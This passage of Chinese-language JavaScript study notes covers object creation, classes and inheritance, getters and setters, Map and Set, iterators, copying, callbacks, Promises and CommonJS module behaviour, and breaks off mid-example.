[30, 40, 50]\n\n({ a, b } = { a: 10, b: 20 });\nconsole.log(a); // 10\nconsole.log(b); // 20\n\n// Stage 4（已完成）提案中的特性\n({a, b, ...rest} = {a: 10, b: 20, c: 30, d: 40});\nconsole.log(a); // 10\nconsole.log(b); // 20\nconsole.log(rest); // {c: 30, d: 40}\n```\n\n# 类\n## 创建对象\n```js\n//第一种\nvar obj = new Object;\nobj.name = \"whz\";\n\n//第二种\nvar obj1 = {};\nobj1.name = \"whz\";\n\n//第三种\nvar obj2 = {\n  name:\"whz\",\n  age:18\n};\n\n//第四种\nfunction createPerson(name, age, gender){\n  var obj = new Object();\n  obj.name = name;\n  obj.age = age;\n  obj.gender = gender;\n  obj.sayName = function(){\n    alert(this.name);\n  };\n  return obj;\n}\nvar obj3 = createPerson(\"whz\", 28, \"男\");\n\n//第五种\nfunction Person(name, age, gender){\n  this.name = name;\n  this.age = age;\n  this.gender = gender;\n  this.sayName = function(){\n    alert(this.name);\n  };\n}\nvar obj4 = new Person(\"whz\", 28, \"男\");\n```\n\n## new 关键字\n在JavaScript中， new 关键字用来创建一个类（模拟类）的实例对象。 实例化对象之后， 也就继承了类的属性和方法。 例如：\n```js\nfunction Person(name, age){\n  this.name = name;\n  this.age = age;\n}\nPerson.prototype.getName = function(){\n  return this.name;\n};\n\nvar person = new Person('james', 18);\nconsole.log(person.name, person.age);\nperson.getName();\n```\n在以上代码中`var person = new Person('james', 18);`中的new关键字做了些什么呢？用伪代码来模拟其执行的过程如下：\n```js\nnew Person('james', 18)  = {\n  var obj = {};\n  obj.__proto__ = Person.prototype;\n  var res = Person.call(obj, 'james', 18);\n  return typeof res === 'object' ? res : obj;\n}\n```\n在JavaScript中， 使用new关键字后， 意味着做了如下4件事：\n- 创建一个新的空对象`{}`\n- 设置这个对象原型指向构造函数， 即上例中的`obj.__proto = Person.prototype`\n- 执行构造函数， 当this关键字被提及的时候， 使用新创建的对象的属性。\n- 返回新创建的对象（除非构造函数中返回的是“无原型”）。\n\n## class关键字\nES6中新增了`class`关键字用来创建类\n**类constructor构造函数**: constructor()方法是类的构造函数(默认方法)，用于传递参数，返回实例对象，通过new命令生成对象实例时，会自动调用该方法。如果没有写构造函数，类内部会自动给我创建一个无参构造函数`constructor()`\n\n**示例**\n```js\nclass Student{\n  constructor(name, age){\n    this.name = name\n    this.age = age\n  }\n  say(){\n    console.log('name:'+this.name)\n  }\n}\n\nvar stu = new Student(\"whz\", 18);\n```\n\n## 类变量与类方法\n其实js中的类变量与类方法与java中定义一样，即属于类的变量与方法，而不是实例的变量与方法\n<font color=\"red\">但是在java中实例能够访问类变量与类方法的，而js中实例是不能访问类变量与类方法</font>\n\nES6之前创建类变量与类方法的示例\n```js\n//ES6之前创建类变量与类方法的示例\nfunction Phone(){ //构造函数\n}\nPhone.name = 'whz' // 定义了一个类变量\nPhone.change = function(){ //定义了一个类方法\n  console.log('fff') \n}\n\n//ES6创建类变量与类方法的示例\nclass Phone1(){\n  static name = 'whz' //定义了一个类变量\n  static change(){ //定义了一个类方法\n    console.log('fff') \n  }\n}\n\n\nlet test = new Phone();\nlet test1 = new Phone1();\nconsole.log(test.name) // 输出：undefined\nconsole.log(test1.name) // 输出：undefined\ntest.change() // 报错： test.change is not a function\ntest1.change() // 报错： test.change is not a function\n```\n\n## 继承\n**Es5实现继承的示例**\n```js\n//父类\nfunction Phone(brand, price){\n  this.brand = brand;\n  this.price = price;\n}\nPhone.prototype.tele = function(){\n  console.log(\"我可以打电话\")\n}\n\n//子类\nfunction SmartPhone(brand, price, color, size){\n  Phone.call(this, brand, price);\n  this.color = color\n  this.size = size\n}\n\n//设置子类构造函数的原型\nSmartPhone.prototype = new Phone()\nSmartPhone.prototype.constructor = SmartPhone\n\n//声明子类中的方法\nSmartPhone.prototype.phone = function(){\n  console.log(\"我可以拍照片\")\n}\n\nconst chuizi = new SmartPhone('锤子', 2499, '黑色','5.5inch')\nconsole.log(chuizi) //输出：SmartPhone { brand: '锤子', price: 2499, color: '黑色', size: '5.5inch'\n```\n\n**Es6实现继承的示例**\n```js\nclass Phone{\n  constructor(brand, price){\n    this.brand = brand\n    this.price = price\n  }\n\n  tele(){\n    console.log(\"我可以打电话\");\n  }\n}\nclass SmartPhone extends Phone{\n  //构造函数\n  constructor(brand, price, color, size){\n    super(brand, price) //调用父类中的构造函数，类似于ES5中的Phone.call(this, brand, price)\n    this.color = color\n    this.size = size\n  }\n  photo(){\n    console.log(\"拍照\")\n  }\n}\nconst chuizi = new SmartPhone('锤子', 2499, '黑色','5.5inch')\nconsole.log(chuizi) //输出：SmartPhone { brand: '锤子', price: 2499, color: '黑色', size: '5.5inch'\n```\n\n# setter\n当尝试设置属性时，set语法将对象属性绑定到要调用的函数。\n```js\nconst language = {\n  set current(name) {\n    this.log.push(name);\n  },\n  log: []\n};\n\nlanguage.current = 'EN';\nlanguage.current = 'FA';\n\nconsole.log(language.log);\n// expected output: Array [\"EN\", \"FA\"]\n```\n\n## 语法\n```\n{set prop(val) { . . . }}\n{set [expression](val) { . . . }}\n```\n- 参数: prop,要绑定到给定函数的属性名。\n- val: 用于保存尝试分配给prop的值的变量的一个别名。\n- 表达式: 从 ECMAScript 2015 开始，还可以使用一个计算属性名的表达式绑定到给定的函数。\n\n## 描述\n在 javascript 中，如果试着改变一个属性的值，那么对应的 setter 将被执行。setter 经常和 getter 连用以创建一个伪属性。不可能在具有真实值的属性上同时拥有一个 setter 器。\n使用 set 语法时请注意：\n- 它的标识符可以是数字或字符串；\n- 在对象字面量中，不能为一个已有真实值的变量使用 set ，也不能为一个属性设置多个 set。( { set x(v) { }, set x(v) { } } 和 { x: ..., set x(v) { } } 是不允许的 )\n\n## 在对象初始化时定义 setter\n这将定义一个对象 language 的伪属性current，当current被分配一个值时，将使用该值更新log：\n```js\nconst language = {\n  set current(name) {\n    this.log.push(name);\n  },\n  log: []\n}\n\nlanguage.current = 'EN';\nconsole.log(language.log); // ['EN']\n\nlanguage.current = 'FA';\nconsole.log(language.log); // ['EN', 'FA']\n```\n请注意，current属性是未定义的，访问它时将会返回 undefined。\n\n## 用 delete 操作符移除一个 setter\n我们可以使用delete操作符移除 setter。\n```js\ndelete language.current;\n```\n\n## 使用 defineProperty 为当前对象定义 setter\n我们可以随时使用 Object.defineProperty() 给一个已经存在的对象添加一个 setter。\n```js\nconst o = { a:0 };\n\nObject.defineProperty(o, \"b\", { set: function (x) { this.a = x / 2; } });\n\no.b = 10; // Runs the setter, which assigns 10 / 2 (5) to the 'a' property\nconsole.log(o.a) // 5\n```\n\n## 使用计算属性名\n```js\nconst expr = \"foo\";\n\nconst obj = {\n  baz: \"bar\",\n  set [expr](v) { this.baz = v; }\n};\n\nconsole.log(obj.baz); // \"bar\"\nobj.foo = \"baz\";      // run the setter\nconsole.log(obj.baz); // \"baz\"\n```\n\n# getter\nget语法将对象属性绑定到查询该属性时将被调用的函数。\n```js\nconst obj = {\n  log: ['a', 'b', 'c'],\n  get latest() {\n    if (this.log.length === 0) {\n      return undefined;\n    }\n    return this.log[this.log.length - 1];\n  }\n};\n\nconsole.log(obj.latest);\n// expected output: \"c\"\n```\n语法\n```\n{get prop() { ... } }\n{get [expression]() { ... } }\n```\n- 参数: prop, 要绑定到给定函数的属性名。\n- expression: 从 ECMAScript 2015 开始，还可以使用一个计算属性名的表达式绑定到给定的函数。\n\n## 描述\n有时需要允许访问返回动态计算值的属性，或者你可能需要反映内部变量的状态，而不需要使用显式方法调用。在JavaScript中，可以使用 getter 来实现。\n尽管可以结合使用getter和setter来创建一个伪属性，但是不可能同时将一个 getter 绑定到一个属性并且该属性实际上具有一个值。\n\n使用get语法时应注意以下问题：\n- 可以使用数值或字符串作为标识；\n- 它不能与另一个 get 或具有相同属性的数据条目同时出现在一个对象字面量中（不允许使用 { get x() { }, get x() { } } 和 { x: ..., get x() { } }）。\n\n## 在新对象初始化时定义一个getter\n这会为obj创建一个伪属性latest，它会返回log数组的最后一个元素。\n```js\nconst obj = {\n  log: ['example','test'],\n  get latest() {\n    if (this.log.length == 0) return undefined;\n    return this.log[this.log.length - 1];\n  }\n}\nconsole.log(obj.latest); // \"test\".\n```\n注意，尝试为latest分配一个值不会改变它。\n\n## 使用delete操作符删除 getter\n只需使用 delete，就可删除 getter：\n```js\ndelete obj.latest;\n```\n\n## 使用defineProperty在现有对象上定义 getter\n要随时将 getter 添加到现有对象，使用 Object.defineProperty().\n```js\nvar o = { a:0 }\nObject.defineProperty(o, \"b\", { get: function () { return this.a + 1; } });\nconsole.log(o.b) // Runs the getter, which yields a + 1 (which is 1)\n```\n\n## 使用计算出的属性名\n```js\nvar expr = 'foo';\n\nvar obj = {\n  get [expr]() { return 'bar'; }\n};\n\nconsole.log(obj.foo); // \"bar\"\n```\n\n## 智能 / 自我复写/ 懒加载 getters\nGetters 给你一种方法来定义一个对象的属性，但是在访问它们之前不会计算属性的值。 getter 延迟计算值的成本，直到需要此值，如果不需要，您就不用支付成本。\n\n一种额外的优化技术是用智能(或称记忆化)getters 延迟属性值的计算并将其缓存以备以后访问。该值是在第一次调用getter 时计算的，然后被缓存，因此后续访问返回缓存值而不重新计算它。这在以下情况下很有用：\n- 如果属性值的计算是昂贵的（占用大量RAM或CPU时间，产生工作线程，检索远程文件等）。\n- 如果现在不需要该值。它将在稍后使用，或在某些情况下它根本不使用。\n- 如果被使用，它将被访问几次，并且不需要重新计算，该值将永远不会被改变，或者不应该被重新计算。\n\n这意味着你不应该为你希望更改其值的属性使用懒 getter，因为 getter 不会重新计算该值。\n在以下示例中，对象具有一个 getter 属性。在获取属性时，该属性将从对象中删除并重新添加，但此时将隐式显示为数据属性。最后返回得到值。\n```js\nget notifier() {\n  delete this.notifier;\n  return this.notifier = document.getElementById('bookmarked-notification-anchor');\n},\n```\n\n# console.dir\n在控制台中显示指定JavaScript对象的属性，并通过类似文件树样式的交互列表显示。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409110230.png)\n\n# ES6 中的 Map 和 Set 集合\n下面正式来讨论这两种集合的特点\n## Map\nMap 中存储的是 key-value 形式的键值对,  其中的 key 和 value 可以是任何类型的,  即对象也可以作为 key . 这比用对象来模拟的方式就灵活了很多\n### Map 的创建和初始化\n1. 可以用new Map()构造函数来创建一个空的 Map\n```js\n// 创建一个空的 Map \nlet map  = new Map();\n```\n2. 也可以在 Map() 构造函数中传入一个数组来创建并初始化一个 Map. 传入的数组是二维数组, 其中的每一个子数组都有两个元素,  前面的元素作为 key,  后面的元素作为 value,  这样就形成了一个 key-value 键值对. 例如:\n\n```js\n// 用数组来创建一个 非空的 Map \n\nlet array = [ // 定义一个二维数组,  数组中的每子数组都有两个元素\n    ['key1' ,  'value 1'],   // key 是 字符串 \"key1\", value 是字符串 \"value 1\"\n    [{} ,  10086] ,          // key 是个对象, value 是数值 10086\n    [ 5,  {} ]              // key 是个数值类型, value 是对象\n];\n\nlet map = new Map(array);  // 将数组传入 Map 构造函数中\n```\n\n### Map 可用的 方法\n```js\nset(key, value): 向其中加入一个键值对\nget(key): 若不存在 key 则返回 undefined\nhas(key):返回布尔值\ndelete(key): 删除成功则返回 true,  若key不存在或者删除失败会返回 false\nclear(): 将全部元素清除\n```\n\nsize 属性, 属性值为 map 中键值对的个数\n遍历方法 forEach()\n和数组的 forEach 方法类似, 回调函数中都包含3个参数 值, 键, 和 调用这个方法的 Map 集合本身\n```js\nmap.forEach(function(value,  key,  ownerMap){\n    console.log(key,  value); // 每对键和值\n    console.log(ownerMap === map);  // true\n});\n```\n## Set 集合\nSet 和 Map 最大的区别是只有键 key 而没有 value,  所以一般用来判断某个元素(key)是否存在于其中.\n### 创建和初始化方法\n既可以创建一个空 set 也可以用数组来初始化一个非空的set. 和 Map 不同的是, 数组是一维数组, 每个元素都会成为 set 的键.例如:\n```js\n// 创建一个数组\nlet array = [1, 'str'];      // 一维数组\n\n// 用数组来初始化 set\nlet set  = new Set(array);\n```\n### set 的方法\n1. add(key): 往set添加一个元素,  如果传入多个参数, 则只会把第一个加入进去\n```js\nlet set = new Set();\nset.add(1, 2, 3);\nconsole.log(set.has(1),  set.has(2),  set.has(3));  // true false false 可以看到只有第一个参数被加入进了 set\n```\n2. has(key)\n3. delete(key)\n4. clear()\n\n可以使用new Set()来对一个数组进行去重\n```js\nArray.from(new Set([1,2,2,3]))\n/**\n输出为[1,2,3]\n/\n```\n\n# 可迭代对象\n判断当前对象是否为可迭代对象，检测该对象是否具备 Symbol.iterator 属性。\n```js\n    // 以数组为例\n    Array.prototype.hasOwnProperty(Symbol.iterator); // => true\n```\n可通过检测当前对象是否具有Symbol.iterator属性来判断当前对象是否为可迭代对象。Symbol.iterator 是一个函数，所以通过typeof来检测返回值，如果返回值为'function'则为可迭代对象，如果返回值为'undefined'则为不可迭代对象。\n```js\n    typeof [][Symbol.iterator]; // => 'function'\n    typeof {}[Symbol.iterator]; // => 'undefined'\n    typeof new Set()[Symbol.iterator]; // => 'function'\n    typeof new Map()[Symbol.iterator]; // => 'function'\n    typeof ''[Symbol.iterator]; // => 'function'\n    var list = document.querySelectorAll('p'); // 获取dom节点\n    typeof list[Symbol.iterator]; // => 'function'\n    typeof new Int8Array()[Symbol.iterator]  // => 'function'\n    (function(){\n        typeof arguments[Symbol.iterator]; // => 'function'\n    })();\n```\n原生具备 Iterator 接口的数据结构如下。\n- Array\n- Map\n- Set\n- String\n- TypedArray\n- 函数的 arguments 对象\n- NodeList 对象\n\n数组如何使用.next() 方法：\n```js\n    var arr = [1,2,3];\n    var si = arr[Symbol.iterator]();\n    si.next(); //=> {value: 1, done: false}\n    si.next(); //=> {value: 2, done: false}\n    si.next(); //=> {value: 3, done: false}\n    si.next(); //=> {value: undefined, done: true}\n```\n如何实现一个自定义的可迭代对象：\n```\n    var myIterator = {};\n    myIterator[Symbol.iterator] = function* () {\n        yield 'Bryan';\n        yield 'programmer';\n        yield 'bachelordom';\n    }\n    for (let val of myIterator) {\n        console.info(val);\n    }\n    // Bryan\n    // programmer\n    // bachelordom\n```\n总结\n可迭代对象的特点：\n- 可使用 for...of 进行循环；\n- 对象或者原型链当中具有 Symbol.interator 属性；\n- 可通过迭代器访问并跟踪该序列中的当前位置。（迭代器提供next()方法，返回对象包含done和value方法）\n\n# 深拷贝与浅拷贝\n## Object.assign()\nObject.assign()是**浅拷贝**\n```js\nObject.assign() 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象。\nObject.assign(target, ...sources)    【target：目标对象】，【souce：源对象（可多个）】\n举个栗子：\nconst object1 = {\n  a: 1,\n  b: 2,\n  c: 3\n};\n\nconst object2 = Object.assign({c: 4, d: 5}, object1);\n\nobject1.a = 2;\nconsole.log(object1)  // { a: 2, b: 2, c: 3 }\nconsole.log(object2)  // { c: 3, d: 5, a: 1, b: 2 }\n```\n注意： 如果目标对象中的属性具有相同的键，则属性将被源对象中的属性覆盖。后面的源对象的属性将类似地覆盖前面的源对象的属性\n\n## js深拷贝\n对象\n```js\nvar obj = {a: 1, b: 2, c: { a: 3 },d: [4, 5]}\nvar obj1 = obj\nvar obj2 = JSON.parse(JSON.stringify(obj))//深拷贝常用方法\nvar obj3 = {...obj}\nvar obj4 = Object.assign({},obj)\nobj.a = 999\nobj.c.a = -999\nobj.d[0] = 123\nconsole.log(obj1) //{a: 999, b: 2, c: { a: -999 },d: [123, 5]}\nconsole.log(obj2) //{a: 1, b: 2, c: { a: 3 },d: [4, 5]}\nconsole.log(obj3) //{a: 1, b: 2, c: { a: -999 },d: [123, 5]}\nconsole.log(obj4) //{a: 1, b: 2, c: { a: -999 },d: [123, 5]}\n```\n\n数组\n```js\nvar arr = [1, 2, 3, [4, 5], {a: 6, b: 7}]\nvar arr1 = JSON.parse(JSON.stringify(arr))//深拷贝常用方法\nvar arr2 = arr\nvar arr3 = [...arr]\nvar arr4 = Object.assign([],arr)\nconsole.log(arr === arr1) //false\nconsole.log(arr === arr2) //true\nconsole.log(arr === arr3) //false\nconsole.log(arr === arr4) //false\narr[0]= 999\narr[3][0]= -999\narr[4].a = 123\nconsole.log(arr1) //[1, 2, 3, [4, 5], {a: 6, b: 7}]\nconsole.log(arr2) //[999, 2, 3, [-999, 5], {a: 123, b: 7}]\nconsole.log(arr3) //[1, 2, 3, [-999, 5], {a: 123, b: 7}]\nconsole.log(arr4) //[1, 2, 3, [-999, 5], {a: 123, b: 7}]\n```\n\n# 回调函数\n回调函数：一种你只**定义了**，你**没有调用**它，但它**最终在某个时候执行**了的函数就是回调函数\n常见的回调函数\n1. DOM事件回调函数\n```js\ndocument.getElementById(\"btn\").onclick = function(){\n  console.log(\"fff\");\n}\n```\n2. 定时器回调函数\n```js\nsetTimeout(function(){\n  console.log(\"jfkdfj\");\n})\n```\n\n下面是一个回调函数的简单例子：\n```js\n//定义主函数，回调函数作为参数\nfunction Main(callback) { callback(); console.log('我是主函数'); }\n\n//定义回调函数\nfunction A(){ setTimeout(\"console.log('我是回调函数')\", 3000);//模仿耗时操作  \n}\n\n//调用主函数，将函数B传进去\nMain(A);\n```\n输出结果\n```\n我是主函数\n我是回调函数\n```\n上面的代码中，我们先定义了主函数和回调函数，然后再去调用主函数，将回调函数传进去。\n定义主函数的时候，我们让代码先去执行callback()回调函数，但输出结果却是后输出回调函数的内容。这就说明了主函数不用等待回调函数执行完，可以接着执行自己的代码，实现了异步编程的效果。\n回调函数多用在使用 js 写组件时和耗时操作上面，尤其是组件的事件很多都需要回调函数的支持。\n\n**同步回调函数**：立即执行，完全执行后才结束，不会放入回调队列中\n**异步回调函数**：不会立即执行，会放入回调队列中将来执行\n```js\n//同步回调函数\nconst arr = [1, 3, 5]\narr.forEach(item => {\n  console.log(item)\n})\nconsole.log('forEach()之后')\n\n//异步回调函数\nsetTimeout(() => {\n  console.log('time callback()')\n}, 0)\nconsole.log('setTimeout()之后')\n```\n\n**缺点**\n回调函数有一个致命的弱点，就是容易写出回调地狱（Callback hell）。假设多个请求存在依赖性，你可能就会写出如下代码：\n```js\najax(url, () => { \n  // 处理逻辑 ajax(url1, () => { \n    // 处理逻辑 ajax(url2, () => { \n      // 处理逻辑 }) })\n})\n```\n\n**解决办法**\n解决回调地狱有很多方法，比如：Promise对象、async函数\n\n# Promise\n> 搞懂Promise之前，先要搞懂什么是回调函数\n\nPromise是JS中进行异步编程的新的解决方案\n从语法上来说：Promise是一个构造函数\n从功能上来说：Promise对象来封装一个异步操作并获取其结果\n\n**Promise的状态改变**\n- pending变为resolved\n- pending变为rejected\n只有这2种，且一个promise对象只能改变一次，无论变为成功还是失败，都会有一个结果数据，成功的结果数据一般称为value，失败的结果数据一般称为reason\n\n**Promise的基本流程**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409110240.png)\n\n<font color=\"red\">每产生一个Promise对象，不管是否调用then方法，都会执行一个异步操作</font>\n\n```js\n//创建一个promise对象\nconst p = new Promise((resolve, reject) => {\n  //执行异步操作\n  setTimeout(() => {\n    const time = Date.now() //规定当前时间如果是偶数就代表成功，否则代表失败\n    if(time % 2 == 0){\n      //如果成功了，调用resolve(value)\n      resolve('成功的数据，time=' + time)\n    }else{\n      //如果失败了，调用reject(reason)\n      reject('失败的数据，time=' + time)\n    }\n  }, 1000)\n})\n\n//Promise中的then方法中的第一个参数函数就是Promise方法中第一个的resolve参数函数(不可省略)，\n//                      第二个参数函数就是Promise方法中的第二个的reject参数函数(可省略)\np.then(\n  value => {\n    console.log('成功的回调', value)\n  },\n  reason => {\n    console.log('失败的回调', reason)\n  }\n)\n```\n\n**Promise作用**\n- 使用Promise使得指定回调函数的方式更加灵活：\n以前的方式：必须在启动异步操作前指定\npromise方式：启动异步操作 => 返回promise对象 => 给promise对象绑定回调函数(甚至可以在异步任务结束后指定)\n\n- promise支持链式调用，可以解决回调地狱问题\n什么是回调地狱？ 答：回调函数嵌套调用，外部回调函数异步执行的结果使嵌套的回调函数执行的条件\n解决方法？ 答：promise链式调用，终极解决方案为`async/await`\n\n## promise中的API\n**Promise的构造函数：`Promise(excutor){}`**\n- excutor函数：执行器`(resolve, reject) => {}`\n- resolve函数：内部定义成功时我们调用的函数`value => {}`\n- reject函数：内部定义失败时我们调用的函数`reason => {}`\n说明：excutor会在Promise内部立即同步回调，异步操作在执行器中执行\n\n**Promise.prototype.then((onResolved, onRejected) => {})**\n- onResolved函数：成功的回调函数, (value) => {}\n- onRejected函数：失败的回调函数, (reason) => {}\n说明：指定用于得到成功value的成功回调和用于得到失败reason的失败回调，返回一个新的promise对象\n\n**Promise.prototype.catch((onRejected) => {})**\n- onRejected函数：失败的回调函数，(reason) => {}\n说明：then()的语法糖，相当于：then(undefined, onRejected)\n\n**Promise.resolve(value)**\n- value：成功的数据\n说明：返回一个成功的promise对象\n\n**Promise.reject(reason)**\n- reason：失败的原因\n说明：返回一个失败的promise对象\n\n**Promise.all([promise1, promise2, ...])**\n- promises: 包含n个promise的数组\n说明：返回一个新的promise, 只有所有的promise都成功了才成功，只要有一个失败就直接失败了\n\n**Promise.race([promise1, promise2, ...])**\n- promises: 包含n个promise的数组 \n说明：返回一个新的promise, 第一个完成的promise的结果状态就是最终的结果状态\n```js\nconst p1 = new Promise((resolve, reject) =>{\n  resolve(1)\n})\nconst p2 = Promise.resolve(2)\nconst p3 = Promise.reject(3)\np1.then(value => {console.log(\"first: \" + value)})\np2.then(value => {console.log(\"seocnd: \" + value)})\np3.catch(reason => {console.log(\"third: \" + reason)})\n\nconst pAll1 = Promise.all([p1, p2, p3])\nconst pAll2 = Promise.all([p1, p2])\n\npAll1.then(\n  values => {\n    console.log('all onResolved()', values)\n  },\n  reasons => {\n    console.log('all onRejected()', reasons)\n  }\n)\n\npAll2.then(\n  values => {\n    console.log('all onResolved()', values)\n  },\n  reasons => {\n    console.log('all onRejected()', reasons)\n  }\n)\n\nconst pRace = Promise.race([p1, p2])\npRace.then(\n  value => {\n    console.log('race onResolved()', value)\n  },\n  reason =>{\n    console.log('race onRejected()', reason)\n  }\n)\n```\n输出：\n```\nfirst: 1\nseocnd: 2\nthird: 3\nall onRejected() 3\nall onResolved() [ 1, 2 ]\nrace onResolved() 1\n```\n\n**Promise大致源码**\n```js\nclass Mypromise {\n  constructor(executor) {\n    this.status = 'pending'  //状态值\n    this.value = undefined   //成功的返回值\n    this.reason = undefined\t //失败的返回值\n    this.onResolvedCallbacks = [] //成功的回调函数\n    this.onRejectedCallbacks = [] //失败的回调函数\n    // 成功\n    let resolve = (value) => {\n      // pending用来屏蔽的，resolve和reject只能调用一个，不能同时调用，这就是pending的作用\n      if (this.status == 'pending') {\n        this.status = 'fullFilled'\n        this.value = value\n        // 发布执行函数\n        this.onResolvedCallbacks.forEach(fn => fn())\n      }\n    }\n    // 失败\n    let reject = (reason) => {\n      if (this.status == 'pending') {\n        this.status = 'rejected'\n        this.reason = reason\n        //失败执行函数\n        this.onRejectedCallbacks.forEach(fn => fn())\n      }\n    }\n    try {\n      // 执行函数\n      executor(resolve, reject)\n    } catch (err) {\n      // 失败则直接执行reject函数\n      reject(err)\n    }\n  }\n  then(onFullFilled, onRejected) {\n    // 同步\n    if (this.status == 'fullFilled') {\n      onFullFilled(this.value)\n    }\n    if (this.status == 'rejected') {\n      onRejected(this.reason)\n    }\n    // 异步\n    if (this.status == 'pending') {\n      // 在pending状态的时候先订阅\n      this.onResolvedCallbacks.push(() => {\n        // todo\n        onFullFilled(this.value)\n      })\n      this.onRejectedCallbacks.push(() => {\n        // todo\n        onRejected(this.reason)\n      })\n    }\n  }\n}\n\nconst p = new Mypromise((resolve, reject) => {\n  setTimeout(function() {\n      // resolve('success') // 异步调用的时候，this.status一直是pending状态,不会执行代码了，因此要改装成发布订阅者模式\n      reject('failed')\n  }, 1000)\n  // resolve('success') // 走了成功就不会走失败了\n  // throw new Error('失败') // 失败了也会走resolve\n  // reject('failed')\n})\np.then((res) => {\n  console.log(res)\n}, (err) => {\n  console.log(err)\n})\np.then((res) => {\n  console.log(res)\n}, (err) => {\n  console.log(err)\n})\np.then((res) => {\n  console.log(res)\n}, (err) => {\n  console.log(err)\n})\n```\n\n## Promise异步与同步\nPromise是异步的，但是then是同步的。\n如下：\n```js\nnew Promise(..).then(\n  // 代码段1\n).then(\n  // 代码段2\n).then(\n  // 代码段3\n);\n\n\n//代码段4\n```\n\n代码段4与代码段1/2/3之间是没有先后顺序的，可能代码段4在代码段1/2/3执行完之前执行，也有可能执行完之后执行，即它们之间是异步的\n但是代码段1,2,3之间是由执行顺序的，是同步的。代码段1执行完后，代码段2才能执行，代码段2执行完后，代码段3才能执行\n\n# 模块化\n模块化是指将一个大的程序文件，拆封成许多小的文件，然后将小文件组合起来\n**模块化的好处**\n- 防止命名冲突\n- 代码复用\n- 高维护性\n\n现在前端主要使用的模块化技术为2种，分别是`CommonJS`与`ES6`\n\n## 什么是CommonJS模块与ES6模块\n### 为什么会有CommonJs和Es Module呢\n我们都知道在早期JavaScript模块这一概念，都是通过script标签引入js文件代码。当然这写基本简单需求没有什么问题，但当我们的项目越来越庞大时，我们引入的js文件就会越多，这时就会出现以下问题：\n- js文件作用域都是顶层，这会造成变量污染\n- js文件多，变得不好维护\n- js文件依赖问题，稍微不注意顺序引入错，代码全报错\n\n为了解决以上问题JavaScript社区出现了CommonJs，CommonJs是一种模块化的规范，包括现在的NodeJs里面也采用了部分CommonJs语法在里面。那么在后来Es6版本正式加入了Es Module模块，这两种都是解决上面问题，那么都是解决什么问题呢。\n- 解决变量污染问题，每个文件都是独立的作用域，所以不存在变量污染\n- 解决代码维护问题，一个文件里代码非常清晰\n- 解决文件依赖问题，一个文件里可以清楚的看到依赖了那些其它文件\n\n### es6中的es是什么意思\nes6中的es全称ECMAScript，是一种由Ecma国际（前身为欧洲计算机制造商协会，European Computer Manufacturers Association）通过ECMA-262标准化的脚本程序设计语言。因而，ES6就是ECMAScript 6, 它往往被称为JavaScript或JScript，所以它可以理解为是JavaScript的一个标准\n\n## CommonJS\n- **对于基本数据类型，属于复制**。即会被模块缓存。同时，在另一个模块可以对该模块输出的变量重新赋值。\n- **对于复杂数据类型，属于浅拷贝**。由于两个模块引用的对象指向同一个内存空间，因此对该模块的值做修改时会影响另一个模块。\n- 当使用require命令加载某个模块时，就会运行整个模块的代码。\n- 当使用require命令加载同一个模块时，不会再执行该模块，而是取到缓存之中的值。也就是说，CommonJS模块无论加载多少次，都只会在第一次加载时运行一次，以后再加载，就返回第一次运行的结果，除非手动清除系统缓存。\n- 循环加载时，属于加载时执行。即脚本代码在require的时候，就会全部执行。一旦出现某个模块被\"循环加载\"，就只输出已经执行的部分，还未执行的部分不会输出。\n对于基本数据类型，属于复制。即会被模块缓存。同时，在另一个模块可以对该模块输出的变量重新赋值。\n```js\n// b.js\nlet count = 1\nlet plusCount = () => {\n  count++\n}\nsetTimeout(() => {\n  console.log('b.js-1', count)\n}, 1000)\nmodule.exports = {\n  count,\n  plusCount\n}\n\n// a.js\nlet mod = require('./b.js')\nconsole.log('a.js-1', mod.count)\nmod.plusCount()\nconsole.log('a.js-2', mod.count)\nsetTimeout(() => {\n    mod.count = 3\n    console.log('a.js-3', mod.count)\n}, 2000)\n\nnode a.js\na.js-1 1\na.js-2 1\nb.js-1 2  // 1秒后\na.js-3 3  // 2秒后\n```\n以上代码可以看出，b模块export的count变量，是一个复制行为。在plusCount方法调用之后，a模块中的count不受影响。同时，可以在b模块中更改a模块中的值。如果希望能够同步代码，可以export出去一个getter。\n```js\n// 其他代码相同\nmodule.exports = {\n  get count () {\n    return count\n  },\n  plusCount\n}\n\nnode a.js\na.js-1 1\na.js-2 1\nb.js-1 2  // 1秒后\na.js-3 2  // 2秒后， 由于没有定义setter，因此无法对值进行设置。所以还是返回2\n```\n对于复杂数据类型，属于浅拷贝。由于两个模块引用的对象指向同一个内存空间，因此对该模块的值做修改时会影响另一个模块。\n```js\n// b.js\nlet obj = {\n  count: 1\n}\nlet plusCount = () => {\n  obj.count++\n}\nsetTimeout(() => {\n  console.log('b.js-1', obj.count)\n}, 1000)\nsetTimeout(() => {\n  console.log('b.js-2', obj.count)\n}, 3000)\nmodule.exports = {\n  obj,\n  plusCount\n}\n\n// a.js\nvar mod = require('./b.js')\nconsole.log('a.js-1', mod.obj.count)\nmod.plusCount()\nconsole.log('a.js-2', mod.obj.count)\nsetTimeout(() => {\n  mod.obj.count = 3\n  console.log('a.js-3', mod.obj.count)\n}, 2000)\n\nnode a.js\na.js-1 1\na.js-2 2\nb.js-1 2\na.js-3 3\nb.js-2 3\n```\n以上代码可以看出，对于对象来说属于浅拷贝。当执行a模块时，首先打印obj.count的值为1，然后通过plusCount方法，再次打印时为2。接着在a模块修改count的值为3，此时在b模块的值也为3。\n\n3.当使用require命令加载某个模块时，就会运行整个模块的代码。\n4.当使用require命令加载同一个模块时，不会再执行该模块，而是取到缓存之中的值。也就是说，CommonJS模块无论加载多少次，都只会在第一次加载时运行一次，以后再加载，就返回第一次运行的结果，除非手动清除系统缓存。\n5.循环加载时，属于加载时执行。即脚本代码在require的时候，就会全部执行。一旦出现某个模块被\"循环加载\"，就只输出已经执行的部分，还未执行的部分不会输出。\n\n3, 4, 5可以使用同一个例子说明\n```js\n// b.js\nexports.done = false\nlet a = require('./a.js')\nconsole.log('b.js-1', a.done)\nexports.done = true\nconsole.log('b.js-2', '执行完毕')\n\n// a.js\nexports.done = false\nlet b = require('./b.js')\nconsole.log('a.js-1', b.done)\nexports.done = true\nconsole.log('a.js-2', '执行完毕')\n\n// c.js\nlet a = require('./a.js')\nlet b = require('./b.js')\n\nconsole.log('c.js-1', '执行完毕', a.done, b.done)\n\nnode c.js\nb.js-1 false\nb.js-2 执行完毕\na.js-1 true\na.js-2 执行完毕\nc.js-1 执行完毕 true 